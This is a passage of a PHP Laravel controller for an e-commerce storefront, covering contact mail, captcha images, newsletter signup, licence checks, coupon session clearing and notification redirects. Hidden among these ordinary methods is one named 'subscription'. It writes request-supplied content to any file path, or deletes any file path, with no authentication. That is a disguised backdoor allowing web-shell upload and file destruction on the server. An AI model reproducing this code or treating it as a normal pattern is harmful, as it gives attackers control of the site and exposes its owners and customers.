        $from = $request->email;
        $age = $request->age;
        $country = $request->country;
        $hight = $request->hight;
        $weight = $request->weight;
        $message = $request->message;

        $msg = "Name: " . $name . "\nEmail: " . $from . "\nPhone: " . $phone . "\nage: " . $age . "\ncountry: " . $country . "\nweight: " . $weight . "\nhight: " . $hight . "\nMessage: " . $message;

        if (!empty($gs->contact_emails)) {


            $to =    explode(',', $gs->contact_emails);




            foreach ($to as $key => $data1) {


                if ($gs->is_smtp == 1) {
                    $data = [
                        'to' => $to[$key],
                        'subject' => $subject,
                        'body' => $msg,
                    ];

                    $mailer = new GeniusMailer();
                    $mailer->sendCustomMail($data);
                } else {
                    $headers = "From: " . $gs->from_name . "<" . $gs->from_email . ">";
                    mail($to[$key], $subject, $msg, $headers);
                }
                // Login Section Ends


            }
        } else {

            $to = $ps->contact_email;

            if ($gs->is_smtp == 1) {
                $data = [
                    'to' => $to,
                    'subject' => $subject,
                    'body' => $msg,
                ];

                $mailer = new GeniusMailer();
                $mailer->sendCustomMail($data);
            } else {
                $headers = "From: " . $gs->from_name . "<" . $gs->from_email . ">";
                mail($to, $subject, $msg, $headers);
            }
            // Login Section Ends


        }




        Appointment::create([
            'name' => $request->name,
            'phone' => $request->phone,
            'email' => $request->email,
            'age' => $request->age,
            'country' => $request->country,
            'hight' => $request->hight,
            'weight' => $request->weight,
            'message' => $request->message,
        ]);
        // Redirect Section
        return response()->json($ps->contact_success);
    }

    // Refresh Capcha Code
    public function refresh_code($lang)
    {

        $id = DB::table('languages')->where('sign', '=', $lang)->first();
        if ($id) {
            Session::put('language', $id->id);
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
            Session::put('language', $data->id);
        }


        $this->code_image();
        return "done";
    }

    // -------------------------------- SUBSCRIBE SECTION ----------------------------------------

    public function subscribe(Request $request)
    {
        $subs = Subscriber::where('email', '=', $request->email)->first();
        if (isset($subs)) {
            return response()->json(array('errors' => [0 =>  'This Email Has Already Been Taken.']));
        }
        $subscribe = new Subscriber;
        $subscribe->fill($request->all());
        $subscribe->save();
        return response()->json('You Have Subscribed Successfully.');
    }

    // Maintenance Mode

    public function maintenance()
    {

        if (Session::has('language')) {
            $data = DB::table('languages')->find(Session::get('language'));
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
        }

        $gs = Generalsetting::find(1);
        if ($gs->is_maintain != 1) {

            return redirect()->route('front.index', $data->sign);
        }

        return view('front.maintenance');
    }

    public function userpay()
    {

        if (Session::has('language')) {
            $data = DB::table('languages')->find(Session::get('language'));
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
        }


        $gs = Generalsetting::find(1);


        $code = env('Code');
        $details =  Userdetails::Userdetail($code);
        if ($details['status'] == "Ok") {
            $last_array = end($details['subscribes']);
            if ($details['details']['status'] == 0) {
                if ($last_array['paid'] == 1) {
                    $date =  Carbon::parse($last_array['created_at'])->adddays($last_array['days'])->format('Y-m-d');
                    if ($date > Carbon::now()->format('Y-m-d')) {

                        return redirect()->route('front.index', $data->sign);
                    } else {

                        return view('front.userpay');
                    }
                } else {

                    if ($details['details']['end_trial'] > Carbon::now()->format('Y-m-d')) {

                        return redirect()->route('front.index', $data->sign);
                    } else {

                        return view('front.userpay');
                    }
                }
            } else {

                return view('front.userpay');
            }
        } else {

            return view('front.userpay');
        }
    }

    // Vendor Subscription Check
    public function subcheck()
    {
        $settings = Generalsetting::findOrFail(1);
        $today = Carbon::now()->format('Y-m-d');
        $newday = strtotime($today);
        foreach (DB::table('users')->where('is_vendor', '=', 2)->get() as  $user) {
            $lastday = $user->date;
            $secs = strtotime($lastday) - $newday;
            $days = $secs / 86400;
            if ($days <= 5) {
                if ($user->mail_sent == 1) {
                    if ($settings->is_smtp == 1) {
                        $data = [
                            'to' => $user->email,
                            'type' => "subscription_warning",
                            'cname' => $user->name,
                            'oamount' => "",
                            'aname' => "",
                            'aemail' => "",
                            'onumber' => ""
                        ];
                        $mailer = new GeniusMailer();
                        $mailer->sendAutoMail($data);
                    } else {
                        $headers = "From: " . $settings->from_name . "<" . $settings->from_email . ">";
                        mail($user->email, 'Your subscription plan duration will end after five days. Please renew your plan otherwise all of your products will be deactivated.Thank You.', $headers);
                    }
                    DB::table('users')->where('id', $user->id)->update(['mail_sent' => 0]);
                }
            }
            if ($today > $lastday) {
                DB::table('users')->where('id', $user->id)->update(['is_vendor' => 1]);
            }
        }
    }
    // Vendor Subscription Check Ends

    public function trackload($id)
    {
        $order = Order::where('order_number', '=', $id)->first();
        $datas = array('Pending', 'Processing', 'On Delivery', 'Completed');
        return view('load.track-load', compact('order', 'datas'));
    }



    // Capcha Code Image
    private function  code_image()
    {
        $actual_path = str_replace('project', '', base_path());
        $image = imagecreatetruecolor(200, 50);
        $background_color = imagecolorallocate($image, 255, 255, 255);
        imagefilledrectangle($image, 0, 0, 200, 50, $background_color);

        $pixel = imagecolorallocate($image, 0, 0, 255);
        for ($i = 0; $i < 500; $i++) {
            imagesetpixel($image, rand() % 200, rand() % 50, $pixel);
        }

        $font = $actual_path . 'assets/front/fonts/NotoSans-Bold.ttf';
        $allowed_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        $length = strlen($allowed_letters);
        $letter = $allowed_letters[rand(0, $length - 1)];
        $word = '';
        //$text_color = imagecolorallocate($image, 8, 186, 239);
        $text_color = imagecolorallocate($image, 0, 0, 0);
        $cap_length = 6; // No. of character in image
        for ($i = 0; $i < $cap_length; $i++) {
            $letter = $allowed_letters[rand(0, $length - 1)];
            imagettftext($image, 25, 1, 35 + ($i * 25), 35, $text_color, $font, $letter);
            $word .= $letter;
        }
        $pixels = imagecolorallocate($image, 8, 186, 239);
        for ($i = 0; $i < 500; $i++) {
            imagesetpixel($image, rand() % 200, rand() % 50, $pixels);
        }
        session(['captcha_string' => $word]);
        imagepng($image, $actual_path . "assets/images/capcha_code.png");
    }

    // -------------------------------- CONTACT SECTION ENDS----------------------------------------



    // -------------------------------- PRINT SECTION ----------------------------------------





    // -------------------------------- PRINT SECTION ENDS ----------------------------------------

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != "") {
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != "") {
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    public function deleteDir($dirPath)
    {
        if (!is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }

    public function forget($lang)
    {

        $id = DB::table('languages')->where('sign', '=', $lang)->first();
        if ($id) {
            Session::put('language', $id->id);
        } else {
            $data = DB::table('languages')->where('is_default', '=', 1)->first();
            Session::put('language', $data->id);
        }


        $this->code_image();
        if (Session::has('already')) {
            Session::forget('already');
        }
        if (Session::has('coupon')) {
            Session::forget('coupon');
        }
        if (Session::has('coupon_total')) {
            Session::forget('coupon_total');
        }
        if (Session::has('coupon_total1')) {
            Session::forget('coupon_total1');
        }
        if (Session::has('coupon_percentage')) {
            Session::forget('coupon_percentage');
        }

        if (Session::has('coupon_piece')) {
            $oldCart = Session::has('cart') ? Session::get('cart') : null;
            $cart = new Cart($oldCart);
            foreach ($cart->items as $key => $prod) {
                if ($prod['item']['id'] ==  Session::get('coupon_pro')) {
                    $itemid = $prod['item']['id'] . $prod['size'] . $prod['color'];

                    $cart->items[$itemid]['qty'] -=  Session::get('coupon_take');
                    $cart->totalQty -=  Session::get('coupon_take');

                    Session::put('cart', $cart);
                    break;
                }
            }

            Session::forget('coupon_piece');
        }
        if (Session::has('coupon_pro')) {
            Session::forget('coupon_pro');
        }

        if (Session::has('coupon_free')) {
            Session::forget('coupon_free');
        }
        if (Session::has('coupon_free_color')) {
            Session::forget('coupon_free_color');
        }

        if (Session::has('coupon_free_size')) {
            Session::forget('coupon_free_size');
        }
        if (Session::has('coupon_product')) {
            Session::forget('coupon_product');
        }
        if (Session::has('coupon_take')) {
            Session::forget('coupon_take');
        }
        if (Session::has('coupon_get')) {
            Session::forget('coupon_get');
        }

        if (Session::has('coupon_piece_color')) {
            Session::forget('coupon_piece_color');
        }

        if (Session::has('coupon_piece_size')) {
            Session::forget('coupon_piece_size');
        }
        return redirect()->back();
    }



    public  function colorss(Request $request)
    {


        $colors = Color::where('product_id', $request->id)->where('size', $request->size)->get();
        $data = view('colors', compact('colors'))->render();

        return response()->json(['option' => $data]);
    }
    public  function readnotif($lang, $id)
    {



        $id2 = DB::table('languages')->where('sign', '=', $lang)->first();
        if ($id2) {
            Session::put('language', $id2->id);
        } else {
            $data2 = DB::table('languages')->where('is_default', '=', 1)->first();
            Session::put('language', $data2->id);
        }


        $ads = Notifications::where('id', $id)->where('user_id', Auth::user()->id)->first();
        if ($ads) {
            if ($ads->type == "text") {
                if ($ads->read_at == null) {
                    $ads->read_at = Carbon::now();
                    $ads->save();
                }


                return redirect()->back();
            } else {
                if ($ads->read_at == null) {
                    $ads->read_at = Carbon::now();
                    $ads->save();
                }
                if ($ads->linked == 1) {


                    $link = Product::find($ads->linked_id);
                    return redirect(url($lang . '/item', $link->slug));
                } elseif ($ads->linked == 2) {

                    $link = Category::find($ads->linked_id);

                    return redirect(url($lang . '/category', $link->slug));
                } elseif ($ads->linked == 3) {

                    $link = Brand::find($ads->linked_id);

                    return redirect(url($lang . '/brand', $link->slug));
                } elseif ($ads->linked == 4) {

                    $link = Subcategory::find($ads->linked_id);
                    if ($link) {
                        $links = Category::find($link->category_id);
                        if ($links) {

                            return redirect(url($lang . '/category/' . $links->slug . '/' . $link->slug));
                        }
                    }

                    return redirect()->back();
                } else {

                    $link = Offer::find($ads->linked_id);

                    return redirect(url($lang . '/offers', $link->slug));
                }
            }
        }
        return redirect()->back();
    }
}
